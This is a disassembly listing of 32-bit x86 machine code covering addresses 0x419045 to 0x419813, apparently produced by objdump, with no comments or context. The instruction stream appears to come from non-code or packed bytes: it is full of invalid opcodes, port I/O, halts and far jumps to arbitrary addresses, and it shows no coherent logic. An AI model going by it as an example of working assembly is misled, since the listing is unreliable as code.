  419045:	call   FWORD PTR [esi+0x7f]
  419048:	xor    al,0x5a
  41904a:	ret    
  41904b:	fsubr  DWORD PTR [ecx]
  41904d:	dec    edi
  41904e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41904f:	cmp    eax,0x4a667a01
  419054:	mov    dl,0x4a
  419056:	bswap  eax
  419058:	jle    0x4190c7
  41905a:	nop
  41905b:	xchg   ebp,eax
  41905c:	dec    esi
  41905d:	dec    ebx
  41905e:	div    esp
  419060:	jo     0x41909a
  419062:	push   eax
  419063:	rcr    DWORD PTR [edx],0x12
  419066:	push   0xbdc4cb86
  41906b:	inc    edi
  41906c:	enter  0xd0a2,0xd9
  419070:	sbb    DWORD PTR [ecx-0x5d],esi
  419073:	mov    bh,0x3c
  419075:	adc    DWORD PTR [ecx-0x684c4b41],edi
  41907b:	icebp  
  41907c:	xor    BYTE PTR [edx+0x5c],0x9f
  419080:	mov    edx,0xd368b8b9
  419085:	push   ds
  419086:	aaa    
  419087:	mov    ds:0xb3b50605,eax
  41908c:	or     ah,BYTE PTR [eax]
  41908e:	cwde   
  41908f:	mov    edx,0x5bfb56a1
  419094:	sbb    DWORD PTR [eax+0x3d],edx
  419097:	xchg   ebx,eax
  419098:	rol    bh,1
  41909a:	cs add esp,ebp
  41909d:	mov    ecx,0x4c07141f
  4190a2:	hlt    
  4190a3:	mov    eax,ds:0x75786ff1
  4190a8:	sar    BYTE PTR [ecx+ebp*1-0x3],cl
  4190ac:	js     0x419075
  4190ae:	adc    dl,BYTE PTR [eax]
  4190b0:	pop    ebx
  4190b1:	sar    DWORD PTR [edi+0x4d7d64cf],1
  4190b7:	dec    eax
  4190b8:	mov    es,eax
  4190ba:	ss dec esp
  4190bc:	cdq    
  4190bd:	cdq    
  4190be:	fidivr WORD PTR [eax]
  4190c0:	mov    ch,ah
  4190c2:	lea    edi,[ebx+0x7909210c]
  4190c8:	(bad)  
  4190c9:	push   esi
  4190ca:	xchg   esp,eax
  4190cb:	sbb    al,0xee
  4190cd:	pusha  
  4190ce:	mov    edi,0x7560a4de
  4190d3:	stc    
  4190d4:	or     al,0xfe
  4190d6:	mov    ch,0xb6
  4190d8:	pop    ds
  4190d9:	outs   dx,BYTE PTR ds:[esi]
  4190da:	inc    eax
  4190db:	inc    esp
  4190dc:	push   ss
  4190dd:	sub    al,0x48
  4190df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190e0:	scas   al,BYTE PTR es:[edi]
  4190e1:	lea    esi,[ecx]
  4190e3:	jge    0x4190fd
  4190e5:	rcl    BYTE PTR [edx+0x6f],0x1e
  4190e9:	imul   edx,DWORD PTR [edx+eiz*8+0x289e3319],0x4ed53ec
  4190f4:	es jge 0x4190bb
  4190f7:	mov    edi,0x238d43a2
  4190fc:	out    0x93,eax
  4190fe:	mov    edx,0xddcc083b
  419103:	daa    
  419104:	ds mov ah,0x5d
  419107:	mov    WORD PTR [ecx],ds
  419109:	sub    eax,0x98510cb3
  41910e:	in     al,dx
  41910f:	mov    eax,0x4ac60bbf
  419114:	jg     0x419161
  419116:	adc    edi,DWORD PTR gs:[esp+ebp*2-0x12]
  41911b:	and    cl,al
  41911d:	mov    dh,0x6b
  41911f:	mov    eax,fs
  419121:	mov    ds:0x87fe4aa1,eax
  419126:	xor    ch,BYTE PTR [esi]
  419128:	cmp    DWORD PTR [edx],0x6dc585b
  41912e:	aad    0xd4
  419130:	mov    dl,0x1f
  419132:	push   es
  419133:	retf   0x3e54
  419136:	adc    cl,dh
  419138:	sub    dh,dl
  41913a:	aas    
  41913b:	int3   
  41913c:	mov    bh,0x1d
  41913e:	sbb    eax,DWORD PTR [edx-0x50]
  419141:	add    BYTE PTR [edi],ch
  419143:	sub    DWORD PTR [ebx],ebp
  419145:	jb     0x419174
  419147:	mov    ch,0x17
  419149:	sbb    DWORD PTR [esi+0x52],ecx
  41914c:	in     eax,dx
  41914d:	shl    DWORD PTR [edi-0x5],0xaa
  419151:	or     eax,0xe1dd5c76
  419156:	(bad)  
  419157:	aaa    
  419158:	push   ebp
  419159:	lea    eax,[edi-0x5627cffb]
  41915f:	lahf   
  419160:	xchg   ecx,eax
  419161:	and    eax,0x5a1ded55
  419166:	out    dx,al
  419167:	mov    cl,0xc2
  419169:	and    al,0xaa
  41916b:	mov    WORD PTR [esi+ecx*8+0x230e3856],gs
  419172:	int    0x68
  419174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419175:	cmp    BYTE PTR [bp+di+0x50],0xbd
  41917a:	lahf   
  41917b:	das    
  41917c:	pop    eax
  41917d:	mov    ch,0x79
  41917f:	inc    edx
  419180:	sbb    eax,0x5b365e4f
  419185:	pushf  
  419186:	pop    es
  419187:	call   0x21d8ce62
  41918c:	mov    ebp,0xf467a738
  419191:	data16 mov ds:0x13e98718,al
  419197:	call   0x5b85:0xa31ee78a
  41919e:	test   al,ch
  4191a0:	test   BYTE PTR ds:0xfbc135e6,bl
  4191a6:	or     esp,edx
  4191a8:	out    dx,al
  4191a9:	clc    
  4191aa:	ss push 0x97b3545f
  4191b0:	mov    ebp,0x4635ff4e
  4191b5:	sbb    dl,BYTE PTR [ebp+0x49]
  4191b8:	sar    BYTE PTR [eax],cl
  4191ba:	push   ebp
  4191bb:	jns    0xb1725e22
  4191c1:	(bad)  
  4191c3:	jmp    0x4191a8
  4191c5:	cmc    
  4191c6:	mov    ah,0x92
  4191c8:	addr16 ds xor ch,bh
  4191cc:	ret    
  4191cd:	mov    al,BYTE PTR [eax-0x2e]
  4191d0:	dec    eax
  4191d1:	mov    esi,0x27941b1
  4191d6:	test   BYTE PTR [eax+0x4280c4f2],bl
  4191dc:	das    
  4191dd:	les    edi,FWORD PTR [ecx-0x3dd1eb79]
  4191e3:	add    ecx,DWORD PTR ds:0x323ac4c0
  4191e9:	dec    eax
  4191ea:	sub    BYTE PTR [ebp+ebp*8-0x3115d5c7],al
  4191f1:	lods   al,BYTE PTR ds:[esi]
  4191f2:	mov    eax,ds:0xbbd7515a
  4191f7:	push   ebx
  4191f8:	(bad)  
  4191f9:	sub    DWORD PTR [ecx-0x570355f2],edi
  4191ff:	into   
  419200:	push   ds
  419201:	jmp    DWORD PTR [ebx-0x31]
  419204:	in     al,dx
  419205:	inc    ebp
  419206:	gs loop 0x4191ea
  419209:	mov    dl,0x7a
  41920b:	xor    edx,DWORD PTR [ebx+0x18a312dc]
  419211:	bound  esi,QWORD PTR fs:[esi]
  419214:	imul   esi,esp,0xcbf7a551
  41921a:	dec    edi
  41921b:	clc    
  41921c:	xor    al,0x5e
  41921e:	add    esi,edi
  419220:	jns    0x41927e
  419222:	pop    ss
  419223:	xchg   esp,eax
  419224:	mov    bl,0x95
  419226:	sbb    al,0xe6
  419228:	mov    fs,ebp
  41922a:	ins    DWORD PTR es:[edi],dx
  41922b:	mov    ds:0xcdfb47cd,eax
  419230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419231:	pop    esp
  419232:	fwait
  419233:	shl    BYTE PTR [edi+ebp*1+0xf8fe971],0x5c
  41923b:	imul   DWORD PTR [ecx]
  41923d:	cmova  eax,eax
  419240:	push   ds
  419241:	bound  ebx,QWORD PTR [ebx+0x5a]
  419244:	push   ss
  419245:	xchg   ebx,eax
  419246:	test   al,0x1a
  419248:	pop    ecx
  419249:	mov    WORD PTR [edi+0x77ad909e],?
  41924f:	addr16 jo 0x419252
  419252:	rol    DWORD PTR [esi+0x16],cl
  419255:	mov    ecx,0x8b57aa46
  41925a:	out    0xe7,eax
  41925c:	sbb    eax,0xd2847a69
  419261:	hlt    
  419262:	retf   
  419263:	lahf   
  419264:	jmp    0x6871:0x504eb706
  41926b:	or     edx,0x76
  41926e:	js     0x419291
  419270:	xor    al,0xf6
  419272:	xchg   ecx,eax
  419273:	jecxz  0x419231
  419275:	fisub  DWORD PTR [ecx-0x1]
  419278:	pop    ebx
  419279:	mov    ds:0x4ec0861b,eax
  41927e:	rcr    DWORD PTR [edi],1
  419280:	add    al,0x82
  419282:	push   ebx
  419283:	add    DWORD PTR [esi],eax
  419285:	ja     0x4192d3
  419287:	push   es
  419288:	gs (bad) 
  41928a:	jne    0x41921c
  41928c:	adc    DWORD PTR [edx],edx
  41928e:	mov    ecx,0x6201998f
  419293:	mov    al,ds:0xa2459a03
  419298:	mov    dh,0xff
  41929a:	mov    cl,0x1c
  41929c:	sub    al,0x61
  41929e:	sub    eax,0xae23f943
  4192a3:	and    DWORD PTR [ecx-0x45],ebp
  4192a6:	xchg   WORD PTR cs:[ebp-0x172d0678],di
  4192ae:	rcl    BYTE PTR [eax+ebp*4-0x2d],cl
  4192b2:	scas   al,BYTE PTR es:[edi]
  4192b3:	mov    bh,0x42
  4192b5:	xor    ecx,DWORD PTR [edx]
  4192b7:	xor    DWORD PTR [edx-0x3e589dc5],ebx
  4192bd:	pop    edx
  4192be:	xor    ch,0x42
  4192c1:	inc    esi
  4192c2:	enter  0xd67c,0x94
  4192c6:	mov    ds:0x71bc9c98,eax
  4192cb:	aam    0xcc
  4192cd:	pusha  
  4192ce:	jae    0x419275
  4192d0:	es faddp st(3),st
  4192d3:	sar    DWORD PTR [edi-0x74],cl
  4192d6:	adc    al,0x26
  4192d8:	mov    dl,0xf9
  4192da:	pop    edi
  4192db:	inc    edi
  4192dc:	stos   BYTE PTR es:[edi],al
  4192dd:	jmp    FWORD PTR [ebp-0x51]
  4192e0:	sti    
  4192e1:	mov    ds:0xc5ab2bae,al
  4192e6:	sub    esp,esi
  4192e8:	push   edx
  4192e9:	pop    ds
  4192ea:	and    edi,DWORD PTR [edi]
  4192ec:	push   eax
  4192ed:	(bad)  
  4192ee:	cdq    
  4192ef:	sahf   
  4192f0:	loopne 0x41935a
  4192f2:	iret   
  4192f3:	jo     0x419352
  4192f5:	addr16 xchg ebx,eax
  4192f7:	mov    al,0x2d
  4192f9:	inc    eax
  4192fa:	cmp    al,0xd7
  4192fc:	xor    eax,0x65488393
  419301:	or     al,0x26
  419304:	push   ebp
  419305:	popa   
  419306:	data16 xor bh,dh
  419309:	rol    DWORD PTR [ebp+0x52599816],cl
  41930f:	pusha  
  419310:	fwait
  419311:	repz adc BYTE PTR [ebp-0x48],ah
  419315:	daa    
  419316:	aam    0x99
  419318:	add    al,0x3d
  41931a:	jnp    0x4192ce
  41931c:	adc    eax,0xacd86646
  419321:	lods   al,BYTE PTR ds:[esi]
  419322:	jle    0x419368
  419324:	sub    BYTE PTR [eax],bl
  419326:	in     eax,dx
  419327:	icebp  
  419328:	mov    ch,0x0
  41932a:	jnp    0x419352
  41932c:	ins    DWORD PTR es:[edi],dx
  41932d:	js     0x4193a0
  41932f:	imul   ebp,eax,0xffffffde
  419332:	dec    eax
  419333:	(bad)  
  419334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419335:	xchg   ebx,eax
  419336:	bound  ebx,QWORD PTR [ebx-0x47]
  419339:	mov    BYTE PTR [edx-0x21],0x17
  41933d:	(bad)  
  41933e:	mul    DWORD PTR [edi-0x3a17eaf3]
  419344:	aaa    
  419345:	jns    0x4192ed
  419347:	sbb    edi,DWORD PTR [ebx+esi*1-0x12e25162]
  41934e:	imul   esi,DWORD PTR [edi-0x6],0xfffffffb
  419352:	dec    ebp
  419353:	mov    ebp,0x23e4c290
  419358:	mov    esp,0xf9f9d214
  41935d:	scas   eax,DWORD PTR es:[edi]
  41935e:	and    al,0xc8
  419360:	enter  0x477a,0x1d
  419364:	stc    
  419365:	lahf   
  419366:	mov    bl,0xf7
  419368:	sahf   
  419369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41936a:	ja     0x4193b1
  41936c:	push   ds
  41936d:	sub    al,0x86
  41936f:	dec    edx
  419370:	and    BYTE PTR [ecx+0x586ce1f8],ah
  419376:	jb     0x41932b
  419378:	push   ebp
  419379:	or     esp,DWORD PTR [edx+0x6f]
  41937c:	xor    ah,cl
  41937e:	adc    ecx,ebp
  419380:	xor    DWORD PTR [edi+0x17],esi
  419383:	shl    al,0x7d
  419386:	or     eax,0xc307427c
  41938b:	into   
  41938c:	adc    eax,0xa91e0971
  419391:	daa    
  419392:	xchg   esi,eax
  419393:	push   ds
  419394:	push   ds
  419395:	pop    edi
  419396:	stos   BYTE PTR es:[edi],al
  419397:	int    0x7f
  419399:	and    bh,BYTE PTR [eax+edi*1-0x7324b56a]
  4193a0:	aam    0x7a
  4193a2:	jnp    0x4193b6
  4193a4:	(bad)  
  4193a5:	loope  0x41941f
  4193a7:	dec    ecx
  4193a8:	neg    DWORD PTR [eax-0x2a49603c]
  4193ae:	xor    eax,0x315f6454
  4193b3:	dec    esi
  4193b4:	ror    BYTE PTR [ebx-0x20],1
  4193b7:	(bad)  
  4193b9:	mov    eax,ds:0xb4b3b525
  4193be:	xlat   BYTE PTR ds:[ebx]
  4193bf:	into   
  4193c0:	xchg   edx,eax
  4193c1:	and    ecx,ebp
  4193c3:	cdq    
  4193c4:	push   eax
  4193c5:	and    esi,ecx
  4193c7:	std    
  4193c8:	das    
  4193c9:	arpl   cx,bp
  4193cb:	repz cmp bl,ch
  4193ce:	mov    esi,0x5b0920c2
  4193d3:	(bad)  
  4193d4:	push   ebx
  4193d5:	je     0x419408
  4193d7:	ja     0x4193e2
  4193d9:	in     eax,0xff
  4193db:	pop    ebp
  4193dc:	in     al,dx
  4193dd:	gs aam 0xb1
  4193e0:	lods   al,BYTE PTR ds:[esi]
  4193e1:	clc    
  4193e2:	xor    BYTE PTR [ebx-0x74],0x67
  4193e6:	fxam   
  4193e8:	(bad)  
  4193e9:	xor    BYTE PTR [edi+0x4ae20e43],dh
  4193ef:	stos   DWORD PTR es:[edi],eax
  4193f0:	lods   eax,DWORD PTR ds:[esi]
  4193f1:	mov    ds:0x65931b4a,al
  4193f6:	push   es
  4193f7:	cmp    edi,edx
  4193f9:	jecxz  0x419400
  4193fb:	pop    ecx
  4193fc:	or     BYTE PTR [edx],al
  4193fe:	and    ebp,DWORD PTR [edx+0x486834a4]
  419404:	xadd   DWORD PTR [eax],esp
  419407:	test   BYTE PTR [ebx-0xefe84eb],ch
  41940d:	fs push es
  41940f:	mov    ds,WORD PTR [edi+0xbcd70b2]
  419415:	add    BYTE PTR [edx+eiz*1-0x3c],bl
  419419:	pop    ecx
  41941a:	ds call 0x9fd0:0x4b8659be
  419422:	mov    dh,0x35
  419424:	adc    bl,BYTE PTR [edi]
  419426:	push   ebx
  419427:	nop
  419428:	loopne 0x41946d
  41942a:	in     eax,dx
  41942b:	cmp    ch,bl
  41942d:	out    dx,al
  41942e:	ror    BYTE PTR [ecx+0x3a5dd8b3],0xff
  419435:	call   0xe58a0f6d
  41943a:	les    eax,FWORD PTR [esi]
  41943c:	push   ss
  41943d:	loope  0x419428
  41943f:	ret    0x433
  419442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419443:	cmp    esi,0x5d
  419446:	jo     0x419454
  419448:	pop    es
  419449:	lahf   
  41944a:	mov    ebx,ecx
  41944c:	in     eax,dx
  41944d:	cmp    al,0x83
  41944f:	dec    eax
  419450:	and    bl,bh
  419452:	imul   edx,DWORD PTR [ecx],0xd5e1d514
  419458:	mov    al,0x4e
  41945a:	(bad)  
  41945b:	in     al,dx
  41945c:	jb     0x41949b
  41945e:	pop    esp
  41945f:	popf   
  419460:	jnp    0x41948b
  419462:	je     0x41942b
  419464:	inc    ecx
  419465:	loop   0x419415
  419467:	jns    0x419436
  419469:	xchg   edi,eax
  41946a:	cmc    
  41946b:	stc    
  41946c:	inc    edx
  41946d:	xlat   BYTE PTR ds:[ebx]
  41946e:	inc    esi
  41946f:	enter  0x24f,0x3d
  419473:	fstp   QWORD PTR [eax]
  419475:	adc    bh,al
  419477:	ins    BYTE PTR es:[edi],dx
  419478:	retf   0xa4f8
  41947b:	mov    ebp,0x380fc203
  419480:	mov    DWORD PTR [eax],esp
  419482:	pop    ds
  419483:	dec    edi
  419484:	cmp    edx,ecx
  419486:	mov    ah,0xd7
  419488:	jns    0x419460
  41948a:	aad    0x9f
  41948c:	sub    dh,ch
  41948e:	mov    al,0xb2
  419490:	push   esi
  419491:	prefetch BYTE PTR [edx+0x3f]
  419495:	stc    
  419496:	push   ebx
  419497:	mov    edi,0xa26b3a8a
  41949c:	test   ah,dh
  41949e:	mov    eax,ds:0x9770b989
  4194a3:	mov    DWORD PTR [eax-0x10],ebx
  4194a6:	mov    al,0xf1
  4194a8:	enter  0x2cc3,0x4d
  4194ac:	dec    eax
  4194ad:	call   0xb9e2:0x26a68b72
  4194b4:	adc    ah,BYTE PTR [ecx]
  4194b6:	jb     0x4194b0
  4194b8:	ins    DWORD PTR es:[edi],dx
  4194b9:	push   esp
  4194ba:	nop
  4194bb:	jge    0x419452
  4194bd:	or     al,0x22
  4194bf:	or     al,0xf9
  4194c1:	shl    DWORD PTR [edx],cl
  4194c3:	ror    BYTE PTR [ecx],0x97
  4194c6:	popf   
  4194c7:	cmp    al,0x3
  4194c9:	dec    eax
  4194ca:	imul   ebx,DWORD PTR [edx+0x3e],0x5a31f948
  4194d1:	int    0xc8
  4194d3:	fmul   DWORD PTR [edi]
  4194d5:	mov    eax,0xf8f57663
  4194da:	mov    ebp,DWORD PTR [ebp-0x6f]
  4194dd:	inc    esi
  4194de:	push   ss
  4194df:	repnz loope 0x4194e7
  4194e2:	data16 and al,0x8c
  4194e5:	add    al,0xff
  4194e7:	ja     0x4194a4
  4194e9:	es xchg edx,eax
  4194eb:	push   cs
  4194ec:	jae    0x4194ea
  4194ee:	out    0xf2,eax
  4194f0:	inc    ebp
  4194f1:	addr16 xchg edi,eax
  4194f3:	xor    BYTE PTR [edx-0x7a],ch
  4194f6:	outs   dx,BYTE PTR ds:[esi]
  4194f7:	xor    DWORD PTR [edi],ebx
  4194f9:	jecxz  0x4194a8
  4194fb:	xor    eax,0xa907d39c
  419500:	lea    esi,[esi-0x5dde1383]
  419506:	pop    edx
  419507:	lea    ecx,[ebx]
  419509:	adc    eax,0xbf5c0255
  41950e:	mov    edi,0xe4cb0578
  419513:	rol    DWORD PTR [ebp-0x6f],cl
  419516:	or     ebp,DWORD PTR [ebx]
  419518:	or     ch,0xb2
  41951b:	aad    0xc9
  41951d:	fistp  WORD PTR [ebp+ebp*2+0x5a]
  419521:	mov    bl,0xdf
  419523:	mov    BYTE PTR [edi],bh
  419525:	test   bh,dl
  419527:	push   ds
  419528:	xchg   DWORD PTR [edx-0x11],edi
  41952b:	mov    bh,0x50
  41952d:	lods   al,BYTE PTR ds:[esi]
  41952e:	add    BYTE PTR [ebp-0xf985b90],bl
  419534:	test   eax,0xcab87b86
  419539:	cmp    BYTE PTR [esi],bl
  41953b:	loopne 0x4194f9
  41953d:	pop    ebp
  41953e:	or     BYTE PTR [ecx-0x4],bl
  419541:	ret    0xcf29
  419544:	popf   
  419545:	or     al,0x5
  419547:	inc    ebx
  419548:	and    dx,WORD PTR [esi]
  41954b:	adc    BYTE PTR [edx],dl
  41954d:	cmp    cl,ch
  41954f:	inc    esp
  419550:	test   al,0x2b
  419552:	push   0xe1492d10
  419557:	jmp    0x4195c6
  419559:	dec    ebx
  41955a:	push   edx
  41955b:	js     0x4194f6
  41955d:	loopne 0x419597
  41955f:	fst    DWORD PTR [eax]
  419561:	add    DWORD PTR [edi+esi*2+0x2624d535],edi
  419568:	popa   
  419569:	aas    
  41956a:	pop    esi
  41956b:	data16 and BYTE PTR [ebx],dh
  41956e:	or     eax,DWORD PTR [edi+0x35]
  419571:	jne    0x4195eb
  419573:	(bad)  
  419574:	and    dl,BYTE PTR [ecx-0x2d]
  419577:	pop    ss
  419578:	(bad)  [ebp+0x44]
  41957b:	stos   BYTE PTR es:[edi],al
  41957c:	pusha  
  41957d:	push   esp
  41957e:	xchg   DWORD PTR [eax],esp
  419580:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419581:	pop    esi
  419582:	and    al,0xa
  419584:	fucomip st,st(5)
  419586:	sti    
  419587:	or     al,0xcd
  419589:	cmp    eax,0x1ef573ec
  41958e:	or     DWORD PTR [esi+0x56f52a5b],edi
  419594:	sbb    DWORD PTR [ecx+0x4c],esp
  419597:	sub    bl,BYTE PTR [eax+0x4e]
  41959a:	jecxz  0x41953d
  41959c:	jle    0x419549
  41959e:	mov    si,0x4661
  4195a2:	cmp    DWORD PTR [edx-0x2c],ecx
  4195a5:	iret   
  4195a6:	lods   al,BYTE PTR ds:[esi]
  4195a7:	sub    al,0xf9
  4195a9:	push   0x686c08e
  4195ae:	mov    ecx,esi
  4195b0:	xor    ch,BYTE PTR ds:0xcc72fd7a
  4195b6:	adc    al,0x2a
  4195b8:	ds call 0x285ee55e
  4195be:	add    bh,cl
  4195c0:	gs cmp eax,0xa65fa430
  4195c6:	daa    
  4195c7:	push   ss
  4195c8:	sbb    ecx,DWORD PTR [edi+0x1f3169d6]
  4195ce:	or     ah,BYTE PTR ds:0x8a3d4c80
  4195d4:	push   ebx
  4195d5:	and    eax,0xeb0845a
  4195da:	jo     0x4195ce
  4195dc:	imul   edi,ebx,0xffffffc4
  4195df:	(bad)  
  4195e1:	mov    ds,WORD PTR [edi-0x3cb2c537]
  4195e7:	ror    DWORD PTR [edi+0x943f657],1
  4195ed:	pop    esp
  4195ee:	and    BYTE PTR [ebx],bh
  4195f0:	daa    
  4195f1:	push   0xfeb6b2d7
  4195f6:	sub    edi,ebx
  4195f8:	mov    dl,ah
  4195fa:	sub    edi,DWORD PTR [eax-0x571ecf1d]
  419600:	test   DWORD PTR [esi-0x2fc70e3b],esp
  419606:	jp     0x419623
  419608:	dec    ebx
  419609:	call   0x88cc:0x5bd1ccba
  419610:	jo     0x4195ca
  419612:	repnz cmp ebx,DWORD PTR ss:[edi+edx*4-0x3f]
  419618:	not    ch
  41961a:	adc    al,0x1f
  41961c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41961d:	clc    
  41961e:	mov    es,WORD PTR [ecx-0x4e4a43d]
  419624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419625:	sub    dl,BYTE PTR [ebp+0x4f]
  419628:	or     eax,0xb9601a0d
  41962d:	add    al,0x5e
  41962f:	cmp    esi,edx
  419631:	fxch   st(2)
  419633:	popa   
  419634:	mov    ds:0x5fb6e0ad,eax
  419639:	mov    eax,0x19b4d86
  41963e:	mov    ds:0xd71ea0ab,eax
  419643:	dec    esp
  419644:	loope  0x419660
  419646:	out    dx,al
  419647:	dec    ebp
  419648:	enter  0xfa91,0xe7
  41964c:	cdq    
  41964d:	xchg   ebx,eax
  41964e:	cwde   
  41964f:	sahf   
  419650:	add    ebx,edx
  419652:	cld    
  419653:	sahf   
  419654:	cld    
  419655:	pop    ebx
  419656:	cmp    DWORD PTR [ebp+0x584aef21],0xfea91ba5
  419660:	aas    
  419661:	jge    0x419618
  419663:	jle    0x41961b
  419665:	mov    ebx,DWORD PTR [eax+0x72]
  419668:	push   ebp
  419669:	ss mov esi,0x46fc8342
  41966f:	push   ds
  419670:	inc    edx
  419671:	sbb    ecx,eax
  419673:	test   BYTE PTR [ecx],bl
  419675:	jp     0x41967b
  419677:	test   eax,0x8536d32b
  41967c:	loop   0x4196f0
  41967e:	cdq    
  41967f:	fcomp  DWORD PTR [esi-0x5c]
  419682:	clc    
  419683:	jns    0x419673
  419685:	xchg   BYTE PTR [ecx],cl
  419687:	or     dl,BYTE PTR [eax+eiz*1+0x60]
  41968b:	test   eax,0xbebbaf99
  419690:	ins    DWORD PTR es:[edi],dx
  419691:	or     eax,0x3b046c7c
  419696:	inc    ecx
  419697:	push   eax
  419698:	inc    edx
  419699:	push   es
  41969a:	in     eax,0x49
  41969c:	icebp  
  41969d:	push   0x3a
  41969f:	sahf   
  4196a0:	and    esi,DWORD PTR [edx+0x7b]
  4196a3:	repz scas eax,DWORD PTR es:[edi]
  4196a5:	in     eax,dx
  4196a6:	icebp  
  4196a7:	outs   dx,BYTE PTR ds:[esi]
  4196a8:	neg    cl
  4196aa:	adc    esi,DWORD PTR [edi]
  4196ac:	push   edi
  4196ad:	out    0xc,eax
  4196af:	popf   
  4196b0:	dec    ebp
  4196b1:	mov    ch,0x7a
  4196b3:	pop    esi
  4196b4:	pushf  
  4196b5:	hlt    
  4196b6:	jmp    0x419721
  4196b8:	sub    ebx,edx
  4196ba:	in     eax,dx
  4196bb:	ret    
  4196bc:	jmp    FWORD PTR [edi-0x60f09d36]
  4196c2:	add    al,0xb2
  4196c4:	pushf  
  4196c5:	mov    bh,0x51
  4196c7:	add    al,0xea
  4196c9:	scas   al,BYTE PTR es:[edi]
  4196ca:	(bad)  
  4196cb:	retf   0x5977
  4196ce:	imul   edi,esp,0xed004e25
  4196d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196d5:	ror    edx,1
  4196d7:	into   
  4196d8:	pavgb  mm1,QWORD PTR es:[ecx+esi*2+0x10]
  4196de:	pop    esp
  4196df:	call   0xee44:0x247f2dfa
  4196e6:	out    0xd9,al
  4196e8:	adc    ah,BYTE PTR [eax]
  4196ea:	imul   ebp,DWORD PTR [esi],0xffffff8a
  4196ed:	shl    BYTE PTR [eax+edx*8],1
  4196f0:	lods   al,BYTE PTR ds:[esi]
  4196f1:	leave  
  4196f2:	add    ecx,esi
  4196f4:	ds bt  eax,ecx
  4196f8:	push   esp
  4196f9:	or     al,0xe7
  4196fb:	(bad)
  4196fe:	sbb    bx,WORD PTR [eax-0x5de06463]
  419705:	pop    edi
  419706:	rol    DWORD PTR [eax-0xf],0x1b
  41970a:	test   al,0x59
  41970c:	sar    DWORD PTR [eax+0x71],cl
  41970f:	jae    0x419768
  419711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419712:	inc    esi
  419713:	mov    bl,0x8d
  419715:	add    edx,edi
  419717:	(bad)  
  419718:	sbb    DWORD PTR [ecx],esi
  41971a:	and    ch,BYTE PTR ds:0xaff79134
  419720:	sub    eax,0x252470fe
  419725:	fcmovb st,st(6)
  419727:	test   BYTE PTR [ebp+0x66],bh
  41972a:	pop    eax
  41972b:	imul   esp,DWORD PTR [edi+0xab1aa34],0x32d84752
  419735:	cwde   
  419736:	push   ss
  419737:	out    dx,al
  419738:	ret    0x2682
  41973b:	aas    
  41973c:	and    BYTE PTR [edx],bh
  41973e:	push   0xb
  419740:	in     al,dx
  419741:	dec    ebp
  419742:	jo     0x4196f0
  419744:	cmp    esi,DWORD PTR [edx+ecx*1]
  419747:	sbb    eax,DWORD PTR [edx]
  419749:	fist   DWORD PTR [eax+0x38]
  41974c:	cmp    DWORD PTR [esi+edx*2-0x4e66ee62],edx
  419753:	pop    ecx
  419754:	push   ebp
  419755:	push   eax
  419756:	lahf   
  419757:	jecxz  0x419739
  419759:	pop    ds
  41975a:	(bad)  
  41975c:	aas    
  41975d:	cmp    ah,al
  41975f:	push   edx
  419760:	add    cl,bh
  419762:	pop    edx
  419763:	icebp  
  419764:	and    edi,DWORD PTR [ecx+0x60]
  419767:	imul   edx,eax,0xffffff9d
  41976a:	rcl    BYTE PTR [eax+eiz*1-0x67],cl
  41976e:	mov    edi,0xf47e9cf1
  419773:	xchg   esi,eax
  419774:	add    eax,0xc23db2e2
  419779:	mov    cl,0x33
  41977b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41977c:	pop    ds
  41977d:	push   ebp
  41977e:	mov    esi,0xb2a0b799
  419783:	mov    ah,0x4f
  419785:	sub    eax,0x3c052bd0
  41978a:	inc    esp
  41978b:	mov    esi,edi
  41978d:	retf   0x3d9e
  419790:	adc    eax,0xae302575
  419795:	js     0x4197ce
  419797:	jb     0x419757
  419799:	outs   dx,DWORD PTR ds:[esi]
  41979a:	ds out dx,eax
  41979c:	sahf   
  41979d:	adc    DWORD PTR [ecx+0x14],edi
  4197a0:	cli    
  4197a1:	ins    BYTE PTR es:[edi],dx
  4197a2:	and    BYTE PTR [ebp-0x74416845],bl
  4197a8:	ins    BYTE PTR es:[edi],dx
  4197a9:	iret   
  4197aa:	sbb    al,0x2d
  4197ac:	and    DWORD PTR [esi],edi
  4197ae:	addr16 or ah,dh
  4197b1:	cwde   
  4197b2:	aas    
  4197b3:	pop    ebx
  4197b4:	ds adc eax,0x417f969b
  4197ba:	pop    esi
  4197bb:	pop    ecx
  4197bc:	cmp    ebp,DWORD PTR [esi-0x41]
  4197bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197c0:	mov    ds,WORD PTR [ebx-0x55]
  4197c3:	push   esi
  4197c4:	mov    dh,0x26
  4197c6:	cmovno edi,DWORD PTR [eax]
  4197c9:	mov    ds:0xc7ed7886,al
  4197ce:	sbb    al,0x16
  4197d0:	test   al,0x4c
  4197d2:	add    eax,0x61d4e0a9
  4197d7:	sbb    eax,0xf87d5d4f
  4197dc:	addr16 dec ebx
  4197de:	scas   eax,DWORD PTR es:[edi]
  4197df:	icebp  
  4197e0:	cmp    BYTE PTR [edx+edx*4-0x471310e1],dh
  4197e7:	push   ecx
  4197e8:	repz mov ecx,0xe3ff132b
  4197ee:	jns    0x4197e0
  4197f0:	and    DWORD PTR [esp+ebx*8+0x36],esi
  4197f4:	or     al,0xe1
  4197f6:	out    0x31,al
  4197f8:	lea    ebx,[ebx+0x20]
  4197fb:	cmp    esp,edx
  4197fd:	in     al,0x9c
  4197ff:	rcl    bh,cl
  419801:	inc    eax
  419802:	out    0xa9,eax
  419804:	fist   DWORD PTR [esi+0x22]
  419807:	inc    esp
  419808:	bound  ebp,QWORD PTR ds:[edi+0x6f]
  41980c:	out    dx,eax
  41980d:	shl    ebx,0x8f
  419810:	arpl   WORD PTR [ebx+0x7c],si
  419813:	test   BYTE PTR [ebx],ah
